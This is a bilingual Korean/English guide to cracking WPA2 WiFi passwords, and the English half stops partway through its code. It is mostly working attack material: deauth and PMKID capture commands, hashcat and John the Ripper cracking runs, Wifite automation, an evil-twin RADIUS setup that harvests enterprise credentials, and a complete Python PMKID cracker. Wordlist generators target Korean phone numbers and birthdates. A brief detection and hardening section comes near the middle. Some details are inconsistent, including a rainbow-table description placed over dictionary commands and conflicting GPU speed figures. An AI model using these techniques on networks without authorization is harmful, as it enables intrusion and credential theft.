> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# WPA2 크래킹 완전 가이드

## 0. 초보자를 위한 개념 이해

### WPA2 크래킹이란?

WPA2 크래킹은 WPA2-PSK(Personal) 방식으로 보호된 WiFi 네트워크의 패스워드를 오프라인 사전 대입 또는 마스크 공격으로 복구하는 기법입니다. WPA2 자체 암호화(AES-CCMP)는 강력하지만, 약한 패스워드는 4-way 핸드셰이크 캡처 후 딕셔너리 공격에 취약합니다. 2018년 등장한 PMKID 공격은 핸드셰이크 없이도 패스워드를 오프라인에서 테스트할 수 있습니다.

**왜 배우는가:**
```
WPA2 크래킹 핵심 원리:

  WiFi 연결 시 4-way Handshake 발생
       ↓
  Handshake = 패스워드로 생성된 암호화 데이터 포함
       ↓
  Handshake 파일 캡처 (공중에서 수집 가능)
       ↓
  오프라인 딕셔너리 대입 (GPU 가속으로 수십억 시도/초)
       ↓
  패스워드 일치 확인 (네트워크 연결 불필요)

  강한 패스워드 (12자+ 무작위) → 크래킹 수십 년 소요
  약한 패스워드 (단어+숫자)    → 수 시간 내 크랙 가능
```

### 핵심 개념 정리

```
WPA2 크래킹 방법론:

  방법 1: 4-way Handshake 캡처
    airmon-ng → 모니터 모드 활성화
    airodump-ng → 핸드셰이크 캡처 대기
    aireplay-ng -0 → Deauth로 재연결 강제
    → .cap 파일 저장

  방법 2: PMKID 공격 (2018, Jens Steube)
    hcxdumptool → AP에서 직접 PMKID 수집
    핸드셰이크 불필요 → 더 빠른 수집
    → .pcapng 파일 저장

  크래킹 도구:
    hashcat → GPU 가속 (NVIDIA RTX: 수억 해시/초)
    모드: 딕셔너리(-a 0), 마스크(-a 3), 규칙 기반(-a 0 -r)
```

### 필요한 도구 및 환경
- **aircrack-ng 패키지**: airodump-ng, aireplay-ng, airmon-ng 포함
- **hcxdumptool / hcxtools**: PMKID 공격 및 파일 변환
- **hashcat**: GPU 기반 고속 패스워드 크래킹
- **대형 워드리스트**: rockyou.txt 등 공개 패스워드 목록

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""WPA2 패스워드 강도 평가 — 크래킹 예상 시간 계산."""

import math
import string
from dataclasses import dataclass


@dataclass
class PasswordStrengthResult:
    password: str
    charset_size: int
    entropy_bits: float
    estimated_crack_time_gpu: str  # RTX 3090 기준 (약 5억 해시/초)


def estimate_crack_time(charset: int, length: int) -> str:
    """GPU 크래킹 예상 시간을 계산합니다 (RTX 3090 기준)."""
    combinations = charset ** length
    hashes_per_second = 500_000_000  # 5억 H/s (WPA2 PBKDF2)
    seconds = combinations / hashes_per_second

    if seconds < 60:
        return f"{seconds:.1f}초"
    elif seconds < 3600:
        return f"{seconds / 60:.1f}분"
    elif seconds < 86400:
        return f"{seconds / 3600:.1f}시간"
    elif seconds < 31536000:
        return f"{seconds / 86400:.0f}일"
    else:
        return f"{seconds / 31536000:.0f}년"


def assess_password_strength(password: str) -> PasswordStrengthResult:
    """WiFi 패스워드 강도 및 크래킹 예상 시간 평가."""
    charset = 0
    if any(c.islower() for c in password):
        charset += 26
    if any(c.isupper() for c in password):
        charset += 26
    if any(c.isdigit() for c in password):
        charset += 10
    if any(c in string.punctuation for c in password):
        charset += 32

    entropy = math.log2(charset ** len(password)) if charset > 0 else 0
    crack_time = estimate_crack_time(charset, len(password))

    return PasswordStrengthResult(
        password=password[:3] + "*" * (len(password) - 3),
        charset_size=charset,
        entropy_bits=round(entropy, 1),
        estimated_crack_time_gpu=crack_time,
    )


if __name__ == "__main__":
    test_passwords = ["12345678", "password1", "P@ssw0rd!", "xK9#mL2$qR7&vN4!"]
    print(f"{'패스워드':<20} {'문자셋':>6} {'엔트로피':>10} {'크래킹 예상 시간'}")
    print("-" * 70)
    for pw in test_passwords:
        r = assess_password_strength(pw)
        print(f"{r.password:<20} {r.charset_size:>6} {r.entropy_bits:>9.1f}bit  {r.estimated_crack_time_gpu}")
```

---

## WPA2 크랙 전략 개요

```
WPA2 크랙 방법론
─────────────────────────────────────────
1. 핸드셰이크 수집
   └── 패시브 대기 OR Deauth 강제

2. PMKID 공격 (핸드셰이크 불필요, 2018)
   └── AP에서 직접 수집 가능

3. 오프라인 크래킹
   ├── 딕셔너리 공격 (wordlist)
   ├── 규칙 기반 (hashcat rules)
   ├── 마스크 공격 (패턴 기반)
   └── 레인보우 테이블 (pmkid-cache)

4. 성공 시 비밀번호 확인
─────────────────────────────────────────
```

---

## 1. Hashcat을 이용한 WPA2 크래킹

### 핸드셰이크 파일 변환

aircrack-ng 형식(.cap)의 핸드셰이크 파일을 hashcat이 처리할 수 있는 형식으로 변환합니다. hcxtools의 hcxpcapngtool을 사용합니다.

```bash
# aircrack-ng 캡처 파일 → hashcat 형식
# hcxdumptool/hcxtools 사용 (권장)
sudo apt install hcxdumptool hcxtools

# hcxdumptool으로 직접 캡처 (모든 AP)
sudo hcxdumptool \
    -i wlan0mon \
    -o capture.pcapng \
    --enable_status=3

# 특정 AP만 타겟
echo "AABBCCDDEEFF" > target.txt  # 타겟 BSSID (콜론 없이)
sudo hcxdumptool \
    -i wlan0mon \
    -o capture.pcapng \
    --filterlist_ap=target.txt \
    --filtermode=2

# pcapng → hashcat 형식 변환
hcxpcapngtool capture.pcapng -o capture.hc22000

# 기존 .cap 파일 변환
hcxpcapngtool capture.cap -o capture.hc22000

# 내용 확인
hcxhashtool -i capture.hc22000 --info=short
```

### Hashcat WPA2 크래킹

hashcat 모드 22000으로 WPA2 핸드셰이크나 PMKID를 크래킹합니다. GPU 가속으로 사전 공격과 마스크 공격을 결합하여 효율을 높입니다.

```bash
# 모드 22000 (WPA2 PMKID/핸드셰이크 통합)
# 모드 2500 (WPA2 핸드셰이크, 구버전)

# 딕셔너리 공격
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# 규칙 기반 공격 (효과적)
hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# 마스크 공격 (한국 비밀번호 패턴)
# ?d=숫자, ?u=대문자, ?l=소문자, ?a=모든 문자
hashcat -m 22000 capture.hc22000 -a 3 "?d?d?d?d?d?d?d?d"    # 8자리 숫자
hashcat -m 22000 capture.hc22000 -a 3 "?l?l?l?l?d?d?d?d"    # 소문자4+숫자4
hashcat -m 22000 capture.hc22000 -a 3 "?u?l?l?l?d?d?d?d"    # 대소문자+숫자
hashcat -m 22000 capture.hc22000 -a 3 "010?d?d?d?d?d?d?d?d" # 010으로 시작 전화번호

# 조합 공격 (두 wordlist 결합)
hashcat -m 22000 capture.hc22000 -a 1 wordlist1.txt wordlist2.txt

# 하이브리드 (딕셔너리 + 마스크)
hashcat -m 22000 capture.hc22000 -a 6 wordlist.txt "?d?d?d?d"  # 단어+숫자4개

# GPU 사용 최적화
hashcat -m 22000 capture.hc22000 wordlist.txt \
    -d 1 \              # GPU 장치 1 사용
    -w 4 \              # 워크로드 (1=저부하, 4=최대)
    --gpu-temp-abort=90  # 90°C 초과 시 중단

# 세션 저장/복원
hashcat -m 22000 capture.hc22000 wordlist.txt --session=my_session
hashcat -m 22000 --session=my_session --restore  # 이어서 진행

# 크랙된 비밀번호 확인
hashcat -m 22000 capture.hc22000 --show
```

### Aircrack-ng를 이용한 크래킹

rcrack으로 미리 생성된 레인보우 테이블을 사용하여 해시를 크래킹합니다. 저장 공간과 계산 시간을 교환(time-memory trade-off)하는 방식입니다.

```bash
# 딕셔너리 공격
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# 특정 BSSID
aircrack-ng capture-01.cap \
    -b AA:BB:CC:DD:EE:FF \
    -w wordlist.txt

# 실시간 확인 (진행 상황)
aircrack-ng capture-01.cap -w wordlist.txt -q
```

---

## 2. PMKID 공격 (2018)


PMKID 공격은 클라이언트 없이도 AP의 EAPOL 첫 번째 프레임에서 PMKID를 추출하여 오프라인 크래킹을 수행합니다. `hcxdumptool`과 `hcxtools`로 캡처 후 hashcat으로 크래킹합니다.

```
기존: 클라이언트 핸드셰이크 필요 (시간 소요)
PMKID: AP에 연결 시도만으로 수집 가능

PMKID = HMAC-SHA1(PMK, "PMK Name" || BSSID || Client_MAC)
→ PMK = PBKDF2(PSK, SSID)
→ 오프라인 딕셔너리 공격 가능
```

PMKID 공격은 클라이언트 연결 없이도 AP에서 PMKID를 추출하여 WPA2 키를 오프라인으로 크래킹합니다. 2018년 발견된 기법으로 핸드셰이크 캡처보다 효율적입니다.

```bash
# PMKID 수집 (hcxdumptool)
sudo hcxdumptool \
    -i wlan0mon \
    -o pmkid.pcapng \
    --enable_status=3 \
    --filterlist_ap=target.txt

# 수집 즉시 확인
hcxhashtool -i pmkid.pcapng --pmkid | head

# hashcat 형식으로 변환
hcxpcapngtool pmkid.pcapng -o pmkid.hc22000

# 크래킹
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

---

## 3. Wordlist 최적화

### 효과적인 워드리스트 구성

WPA2 크래킹에 효과적인 워드리스트를 구성합니다. rockyou.txt를 기반으로 한국어 패턴(생년월일, 전화번호 등)을 추가하면 성공률이 높아집니다.

```bash
# 기본 워드리스트
/usr/share/wordlists/rockyou.txt          # 1400만개
/usr/share/wordlists/dirbuster/           # 웹 경로용

# 추가 워드리스트 다운로드
wget https://github.com/danielmiessler/SecLists/archive/master.zip
ls SecLists/Passwords/WiFi-WPA/

# 한국어 특화 워드리스트 생성
# 전화번호 패턴
python3 -c "
for i in range(0, 9999):
    print(f'010{i:08d}')
    print(f'011{i:08d}')
    print(f'016{i:08d}')
" > phone_numbers.txt

# 생년월일 패턴
python3 -c "
for year in range(1960, 2010):
    for month in range(1, 13):
        for day in range(1, 32):
            print(f'{year}{month:02d}{day:02d}')
" > birthdays.txt
```

### hashcat 규칙 파일 커스텀

```bash
# custom.rule - 한국 패턴에 최적화된 규칙
# 기본 단어 변형
:            # 원본 유지
l            # 전체 소문자
u            # 전체 대문자
c            # 첫 글자 대문자

# 숫자 추가
$1           # 끝에 1 추가
$123         # 끝에 123 추가
$1234        # 끝에 1234 추가
$!           # 끝에 ! 추가
$@           # 끝에 @ 추가

# 앞에 숫자 추가
^1           # 앞에 1 추가

# 년도 추가
$2024
$2023
$2022
$2021
$2020

# 교체
sa@          # a → @ 교체
se3          # e → 3 교체
si1          # i → 1 교체
so0          # o → 0 교체
```

```bash
# 규칙 적용
hashcat -m 22000 capture.hc22000 base_words.txt -r custom.rule

# 여러 규칙 동시 적용
hashcat -m 22000 capture.hc22000 wordlist.txt \
    -r rule1.rule \
    -r rule2.rule
```

---

## 4. John the Ripper

```bash
# 핸드셰이크 변환 (aircrack 형식)
# john-jumbo에서 지원
john --list=formats | grep WPA

# WPA2 크래킹
wpaclean clean.cap capture-01.cap  # 핸드셰이크 추출
aircrack-ng clean.cap -J john_file  # john 형식으로 변환

john john_file.hccap --wordlist=wordlist.txt

# 증분 공격 (Incremental)
john john_file.hccap --incremental

# 마스크 공격
john john_file.hccap --mask="?d?d?d?d?d?d?d?d"
```

---

## 5. Wifite2 - 자동화 공격

Wifite2는 무선 공격을 자동화하는 도구입니다. 주변 AP를 스캔하고 핸드셰이크 캡처, WPS 공격, PMKID 공격 등을 자동으로 수행합니다.

```bash
# Wifite2 설치
sudo apt install wifite

# 전체 자동 공격
sudo wifite

# 특정 BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# 딕셔너리 지정
sudo wifite --dict /path/to/wordlist.txt

# WPS 공격만
sudo wifite --wps-only

# Deauth 비활성화 (조용한 모드)
sudo wifite --nodeauth

# 옵션
sudo wifite \
    --kill \            # 간섭 프로세스 종료
    --crack \           # 캡처 즉시 크래킹
    --dict rockyou.txt
```

---

## 6. 고급: PMKID 캐시 테이블


PMKID 공격은 클라이언트 없이도 AP의 EAPOL 첫 번째 프레임에서 PMKID를 추출하여 오프라인 크래킹을 수행합니다. `hcxdumptool`과 `hcxtools`로 캡처 후 hashcat으로 크래킹합니다.

```python
#!/usr/bin/env python3
"""
PMKID/WPA2 핸드셰이크 오프라인 크래킹 도구 (교육/CTF 목적)
사용: python3 pmkid_crack.py --ssid MyWiFi --pmkid d6fd... --ap-mac AA:BB --client-mac 11:22 --wordlist rockyou.txt
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import multiprocessing
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Optional


# ------------------------------------------------------------------ #
#  WPA2 암호화 함수
# ------------------------------------------------------------------ #
def compute_pmk(password: str, ssid: str) -> bytes:
    """PMK = PBKDF2-HMAC-SHA1(password, ssid, 4096 rounds, 32 bytes)"""
    return hashlib.pbkdf2_hmac(
        "sha1",
        password.encode("utf-8", errors="replace"),
        ssid.encode("utf-8", errors="replace"),
        4096,
        32,
    )


def compute_pmkid(pmk: bytes, ap_mac_hex: str, client_mac_hex: str) -> str:
    """
    PMKID = HMAC-SHA1(PMK, b'PMK Name' || AP_MAC_bytes || Client_MAC_bytes)[:16]
    """
    ap_bytes = bytes.fromhex(ap_mac_hex.replace(":", "").replace("-", ""))
    client_bytes = bytes.fromhex(client_mac_hex.replace(":", "").replace("-", ""))
    data = b"PMK Name" + ap_bytes + client_bytes
    digest = hmac.new(pmk, data, hashlib.sha1).digest()
    return digest[:16].hex()


def compute_mic(pmk: bytes, ap_nonce: bytes, client_nonce: bytes,
                ap_mac: bytes, client_mac: bytes, eapol_data: bytes) -> str:
    """
    PTK 유도 후 MIC 계산 (4-Way Handshake 검증용)
    PTK = PRF-512(PMK, 'Pairwise key expansion' || min/max(macs) || min/max(nonces))
    """
    # PTK 유도 (802.11i PRF-512)
    def prf512(key: bytes, a: bytes, b: bytes) -> bytes:
        result = b""
        for i in range(4):
            result += hmac.new(key, a + b"\x00" + b + bytes([i]), hashlib.sha1).digest()
        return result[:64]

    min_mac = min(ap_mac, client_mac)
    max_mac = max(ap_mac, client_mac)
    min_nonce = min(ap_nonce, client_nonce)
    max_nonce = max(ap_nonce, client_nonce)

    ptk = prf512(
        pmk,
        b"Pairwise key expansion",
        min_mac + max_mac + min_nonce + max_nonce,
    )
    kck = ptk[:16]   # Key Confirmation Key
    mic = hmac.new(kck, eapol_data, hashlib.md5).hexdigest()
    return mic


# ------------------------------------------------------------------ #
#  크래킹 워커 (멀티프로세싱용)
# ------------------------------------------------------------------ #
def _crack_worker(
    chunk: list[str],
    ssid: str,
    target_pmkid: str,
    ap_mac: str,
    client_mac: str,
    result_queue: multiprocessing.Queue,
) -> None:
    for password in chunk:
        password = password.strip()
        if not password:
            continue
        try:
            pmk = compute_pmk(password, ssid)
            computed = compute_pmkid(pmk, ap_mac, client_mac)
            if computed == target_pmkid.lower():
                result_queue.put(("found", password))
                return
        except Exception:
            continue
    result_queue.put(("done", None))


# ------------------------------------------------------------------ #
#  크래커 메인 클래스
# ------------------------------------------------------------------ #
@dataclass
class PMKIDCracker:
    ssid: str
    target_pmkid: str
    ap_mac: str
    client_mac: str
    wordlist: str
    workers: int = multiprocessing.cpu_count()

    def crack(self) -> Optional[str]:
        wl_path = Path(self.wordlist)
        if not wl_path.exists():
            print(f"[-] 워드리스트 없음: {wl_path}", file=sys.stderr)
            return None

        # 워드리스트 전체 로드 (대용량이면 청크 처리)
        print(f"[*] 워드리스트 로드 중: {wl_path}", file=sys.stderr)
        try:
            with open(wl_path, encoding="latin-1", errors="replace") as fh:
                words = fh.readlines()
        except OSError as exc:
            print(f"[-] 파일 읽기 실패: {exc}", file=sys.stderr)
            return None

        total = len(words)
        print(f"[*] {total:,}개 단어 | 프로세스: {self.workers}개", file=sys.stderr)
        print(f"[*] 타겟 PMKID: {self.target_pmkid}", file=sys.stderr)
        print(f"[*] SSID: {self.ssid}  AP: {self.ap_mac}  Client: {self.client_mac}", file=sys.stderr)

        chunk_size = max(1, total // self.workers)
        chunks = [words[i : i + chunk_size] for i in range(0, total, chunk_size)]

        result_queue: multiprocessing.Queue = multiprocessing.Queue()
        processes = []
        for chunk in chunks:
            p = multiprocessing.Process(
                target=_crack_worker,
                args=(chunk, self.ssid, self.target_pmkid, self.ap_mac, self.client_mac, result_queue),
            )
            p.start()
            processes.append(p)

        start = time.time()
        found_pw: Optional[str] = None
        done_count = 0

        while done_count < len(processes):
            msg_type, value = result_queue.get()
            if msg_type == "found":
                found_pw = value
                for p in processes:
                    p.terminate()
                break
            else:
                done_count += 1

        for p in processes:
            p.join()

        elapsed = time.time() - start

        if found_pw:
            rate = total / elapsed if elapsed > 0 else 0
            print(f"\n[+] 비밀번호 발견: {found_pw}")
            print(f"[+] 경과 시간: {elapsed:.1f}초  속도: {rate:,.0f} PMK/s")
        else:
            print(f"\n[-] 비밀번호를 찾지 못했습니다. ({elapsed:.1f}초 / {total:,}개 시도)")

        return found_pw


# ------------------------------------------------------------------ #
#  CLI
# ------------------------------------------------------------------ #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="PMKID/WPA2 핸드셰이크 오프라인 크래킹 도구 (교육/CTF 목적)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n"
               "  python3 pmkid_crack.py \\\n"
               "    --ssid MyWiFi \\\n"
               "    --pmkid d6fd3e50a1234567890abcdef1234567 \\\n"
               "    --ap-mac AA:BB:CC:DD:EE:FF \\\n"
               "    --client-mac 11:22:33:44:55:66 \\\n"
               "    --wordlist /usr/share/wordlists/rockyou.txt",
    )
    parser.add_argument("--ssid",       required=True, help="타겟 SSID")
    parser.add_argument("--pmkid",      required=True, help="수집된 PMKID (hex 32자)")
    parser.add_argument("--ap-mac",     required=True, help="AP BSSID (AA:BB:CC:DD:EE:FF)")
    parser.add_argument("--client-mac", required=True, help="클라이언트 MAC")
    parser.add_argument("--wordlist",   required=True, metavar="FILE", help="워드리스트 파일")
    parser.add_argument(
        "--workers", type=int, default=multiprocessing.cpu_count(),
        help=f"병렬 프로세스 수 (기본: {multiprocessing.cpu_count()})",
    )
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if len(args.pmkid) != 32:
        parser.error("PMKID는 32자리 hex 문자열이어야 합니다")

    cracker = PMKIDCracker(
        ssid=args.ssid,
        target_pmkid=args.pmkid,
        ap_mac=args.ap_mac,
        client_mac=args.client_mac,
        wordlist=args.wordlist,
        workers=args.workers,
    )
    cracker.crack()


if __name__ == "__main__":
    main()
```

---

## 7. 성능 벤치마크

hashcat 벤치마크로 GPU 성능을 측정합니다. WPA2 모드의 초당 해시 수(H/s)를 확인하여 크래킹 예상 시간을 계산합니다.

```bash
# hashcat 성능 테스트
hashcat -b -m 22000

# 일반적인 성능 (GPU별)
# GTX 1080 Ti: ~500,000 H/s
# RTX 3090:    ~750,000 H/s
# RTX 4090:    ~1,100,000 H/s

# rockyou.txt (14M) 크래킹 예상 시간
# RTX 3090: ~19초 (딕셔너리)
# 8자리 숫자 전체: 100,000,000 / 750,000 = ~133초

# 클라우드 크래킹 (AWS)
# p3.2xlarge (V100): ~400,000 H/s
# 비용: 약 $3/시간

# 분산 크래킹 (Hashtopolis)
# 여러 GPU 서버 연동
# docker run hashtopolis/hashtopolis
```

---

## 8. WPA Enterprise (802.1X) 공격

WPA Enterprise(802.1X) 환경에서 PEAP/MSCHAPv2 자격증명을 캡처합니다. hostapd-wpe로 가짜 RADIUS 서버를 운영하여 자격증명을 가로챕니다.

```bash
# PEAP/MSCHAPv2 캡처 및 크래킹
# EAP 인증 패킷 수집
sudo airodump-ng wlan0mon --write enterprise_capture

# asleap으로 MSCHAPv2 크래킹
asleap -r enterprise_capture-01.cap \
       -W wordlist.txt

# hostapd-wpe (WPA Enterprise Evil Twin)
# 자격증명 수집용 가짜 RADIUS 서버
sudo apt install hostapd-wpe
# /etc/hostapd-wpe/hostapd-wpe.conf 설정 후:
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 캡처된 MSCHAPv2 챌린지/응답 크래킹
hashcat -m 5500 netntlm.txt wordlist.txt  # NTLMv1
hashcat -m 5600 netntlmv2.txt wordlist.txt  # NTLMv2
```

---

<!-- detect-validate-15 -->
## 공격 탐지와 방어 검증

WPA2-PSK 크랙은 *오프라인 공격*이다 — 공격자는 4-way 핸드셰이크(또는 PMKID)만 캡처하면 망을 떠나 사전·GPU로 푼다. 따라서 방어자는 **크랙 자체**가 아니라 **핸드셰이크 캡처 시도(특히 deauth 유발)와 약한 PSK**를 탐지·차단해야 한다. 실습은 **소유·허가된 망**에서만.

### 공격 → 완화 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(예방) | 탐지 신호 |
|---|---|---|---|
| 4-way 핸드셰이크 캡처 | 약한 PSK | 길고 무작위한 PSK, WPA3-SAE | EAPOL 재전송 급증 |
| deauth로 재인증 강제 | 비보호 관리프레임 | 802.11w(PMF) | 다량 deauth/disassoc |
| PMKID 클라이언트리스 | RSN PMKID 노출 | PMKID 비활성, WPA3 | 연결 없는 PMKID 요청 |
| 사전·GPU 크랙 | 사전에 있는 PSK | 패스프레이즈 정책 | (오프라인—예방이 유일) |

### 방어 검증 (직접 확인)

```bash
# 1) deauth가 PMF로 막히는지 검증 — 소유 AP/통제 RF에서만
grep -E '^ieee80211w' /etc/hostapd/hostapd.conf || echo 'PMF 미설정 — 핸드셰이크 강제캡처 취약'
# 2) EAPOL 재전송·deauth 폭주 모니터(캡처에서 핸드셰이크 캡처 시도 탐지)
tshark -r cap.pcap -Y 'eapol || wlan.fc.type_subtype==0x0c' | wc -l
```

> WPA2 크랙은 캡처 후 오프라인이므로 *예방(강한 PSK·WPA3-SAE)*이 본질이고, 탐지는 *캡처 시도(deauth/EAPOL 폭주, PMKID 요청)*에 집중된다 — "WPA2 켰다"와 "핸드셰이크 강제캡처를 못 한다(PMF)"는 다르다([[13_SOC_Blue_Team]], [[16_Cryptography]]).

**최신 기법·통제 (2025–2026):**
- PMKID·핸드셰이크 캡처 크래킹은 약한 PSK에 유효 — 긴 패스프레이즈·WPA3로 방어. 검증: 정책하 PSK가 크래킹에 저항하는지 측정(소유 AP)([[22_Password_Cracking]])
- WPA3-Transition 다운그레이드 위험 — 순수 WPA3가 강제되는지 확인

---

<a name="english"></a>

# Complete WPA2 Cracking Guide

## WPA2 Cracking Strategy Overview

```
WPA2 Cracking Methodology
─────────────────────────────────────────
1. Handshake Capture
   └── Passive waiting OR Force Deauth

2. PMKID Attack (no handshake needed, 2018)
   └── Can be collected directly from AP

3. Offline Cracking
   ├── Dictionary attack (wordlist)
   ├── Rule-based (hashcat rules)
   ├── Mask attack (pattern-based)
   └── Rainbow table (pmkid-cache)

4. Verify password on success
─────────────────────────────────────────
```

---

## 1. WPA2 Cracking with Hashcat

### Converting Handshake Files

Convert handshake files in aircrack-ng format (.cap) to a format that hashcat can process, using hcxpcapngtool from hcxtools.

```bash
# aircrack-ng capture file -> hashcat format
# Use hcxdumptool/hcxtools (recommended)
sudo apt install hcxdumptool hcxtools

# Direct capture with hcxdumptool (all APs)
sudo hcxdumptool \
    -i wlan0mon \
    -o capture.pcapng \
    --enable_status=3

# Target specific AP only
echo "AABBCCDDEEFF" > target.txt  # Target BSSID (no colons)
sudo hcxdumptool \
    -i wlan0mon \
    -o capture.pcapng \
    --filterlist_ap=target.txt \
    --filtermode=2

# Convert pcapng to hashcat format
hcxpcapngtool capture.pcapng -o capture.hc22000

# Convert existing .cap file
hcxpcapngtool capture.cap -o capture.hc22000

# Verify content
hcxhashtool -i capture.hc22000 --info=short
```

### Hashcat WPA2 Cracking

Crack WPA2 handshakes or PMKIDs using hashcat mode 22000. Combine dictionary and mask attacks with GPU acceleration for improved efficiency.

```bash
# Mode 22000 (WPA2 PMKID/handshake unified)
# Mode 2500 (WPA2 handshake, legacy)

# Dictionary attack
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# Rule-based attack (effective)
hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Mask attack (Korean password patterns)
# ?d=digit, ?u=uppercase, ?l=lowercase, ?a=all characters
hashcat -m 22000 capture.hc22000 -a 3 "?d?d?d?d?d?d?d?d"    # 8-digit number
hashcat -m 22000 capture.hc22000 -a 3 "?l?l?l?l?d?d?d?d"    # 4 lowercase + 4 digits
hashcat -m 22000 capture.hc22000 -a 3 "?u?l?l?l?d?d?d?d"    # mixed case + digits
hashcat -m 22000 capture.hc22000 -a 3 "010?d?d?d?d?d?d?d?d" # phone number starting with 010

# Combination attack (combine two wordlists)
hashcat -m 22000 capture.hc22000 -a 1 wordlist1.txt wordlist2.txt

# Hybrid (dictionary + mask)
hashcat -m 22000 capture.hc22000 -a 6 wordlist.txt "?d?d?d?d"  # word + 4 digits

# GPU optimization
hashcat -m 22000 capture.hc22000 wordlist.txt \
    -d 1 \              # Use GPU device 1
    -w 4 \              # Workload (1=low, 4=maximum)
    --gpu-temp-abort=90  # Stop if temperature exceeds 90°C

# Save/restore session
hashcat -m 22000 capture.hc22000 wordlist.txt --session=my_session
hashcat -m 22000 --session=my_session --restore  # Resume

# Show cracked passwords
hashcat -m 22000 capture.hc22000 --show
```

### Cracking with Aircrack-ng

Use pre-generated rainbow tables with rcrack to crack hashes. This is a time-memory trade-off approach.

```bash
# Dictionary attack
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Target specific BSSID
aircrack-ng capture-01.cap \
    -b AA:BB:CC:DD:EE:FF \
    -w wordlist.txt

# Real-time progress check
aircrack-ng capture-01.cap -w wordlist.txt -q
```

---

## 2. PMKID Attack (2018)

The PMKID attack extracts the PMKID from the AP's first EAPOL frame without requiring a client, enabling offline cracking. Capture with `hcxdumptool` and `hcxtools`, then crack with hashcat.

```
Traditional: Requires client handshake (time-consuming)
PMKID: Can be collected with just a connection attempt to the AP

PMKID = HMAC-SHA1(PMK, "PMK Name" || BSSID || Client_MAC)
-> PMK = PBKDF2(PSK, SSID)
-> Offline dictionary attack possible
```

The PMKID attack extracts the PMKID from the AP without client connections and cracks the WPA2 key offline. Discovered in 2018, this technique is more efficient than handshake capture.

```bash
# Collect PMKID (hcxdumptool)
sudo hcxdumptool \
    -i wlan0mon \
    -o pmkid.pcapng \
    --enable_status=3 \
    --filterlist_ap=target.txt

# Immediately verify collection
hcxhashtool -i pmkid.pcapng --pmkid | head

# Convert to hashcat format
hcxpcapngtool pmkid.pcapng -o pmkid.hc22000

# Crack
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

---

## 3. Wordlist Optimization

### Effective Wordlist Construction

Build effective wordlists for WPA2 cracking. Adding Korean patterns (birth dates, phone numbers, etc.) to the rockyou.txt base wordlist improves the success rate.

```bash
# Base wordlists
/usr/share/wordlists/rockyou.txt          # 14 million entries
/usr/share/wordlists/dirbuster/           # For web paths

# Download additional wordlists
wget https://github.com/danielmiessler/SecLists/archive/master.zip
ls SecLists/Passwords/WiFi-WPA/

# Generate Korean-specific wordlist
# Phone number patterns
python3 -c "
for i in range(0, 9999):
    print(f'010{i:08d}')
    print(f'011{i:08d}')
    print(f'016{i:08d}')
" > phone_numbers.txt

# Birth date patterns
python3 -c "
for year in range(1960, 2010):
    for month in range(1, 13):
        for day in range(1, 32):
            print(f'{year}{month:02d}{day:02d}')
" > birthdays.txt
```

### Custom hashcat Rule Files

```bash
# custom.rule - rules optimized for Korean patterns
# Basic word transformations
:            # keep original
l            # all lowercase
u            # all uppercase
c            # capitalize first letter

# Append digits
$1           # append 1 at end
$123         # append 123 at end
$1234        # append 1234 at end
$!           # append ! at end
$@           # append @ at end

# Prepend digits
^1           # prepend 1

# Append years
$2024
$2023
$2022
$2021
$2020

# Substitutions
sa@          # replace a with @
se3          # replace e with 3
si1          # replace i with 1
so0          # replace o with 0
```

```bash
# Apply rules
hashcat -m 22000 capture.hc22000 base_words.txt -r custom.rule

# Apply multiple rules simultaneously
hashcat -m 22000 capture.hc22000 wordlist.txt \
    -r rule1.rule \
    -r rule2.rule
```

---

## 4. John the Ripper

```bash
# Convert handshake (aircrack format)
# Supported in john-jumbo
john --list=formats | grep WPA

# WPA2 cracking
wpaclean clean.cap capture-01.cap  # Extract handshake
aircrack-ng clean.cap -J john_file  # Convert to john format

john john_file.hccap --wordlist=wordlist.txt

# Incremental attack
john john_file.hccap --incremental

# Mask attack
john john_file.hccap --mask="?d?d?d?d?d?d?d?d"
```

---

## 5. Wifite2 - Automated Attack

Wifite2 is a tool that automates wireless attacks. It automatically scans nearby APs and performs handshake capture, WPS attacks, PMKID attacks, and more.

```bash
# Install Wifite2
sudo apt install wifite

# Full automated attack
sudo wifite

# Target specific BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# Specify dictionary
sudo wifite --dict /path/to/wordlist.txt

# WPS attack only
sudo wifite --wps-only

# Disable deauth (quiet mode)
sudo wifite --nodeauth

# Options
sudo wifite \
    --kill \            # Kill interfering processes
    --crack \           # Crack immediately after capture
    --dict rockyou.txt
```

---

## 6. Advanced: PMKID Cache Table

The PMKID attack extracts the PMKID from the AP's first EAPOL frame without requiring a client, enabling offline cracking. Capture with `hcxdumptool` and `hcxtools`, then crack with hashcat.

```python
#!/usr/bin/env python3
"""
PMKID/WPA2 handshake offline cracking tool (for educational/CTF purposes)
Usage: python3 pmkid_crack.py --ssid MyWiFi --pmkid d6fd... --ap-mac AA:BB --client-mac 11:22 --wordlist rockyou.txt
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import multiprocessing
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Optional


# ------------------------------------------------------------------ #
#  WPA2 cryptographic functions
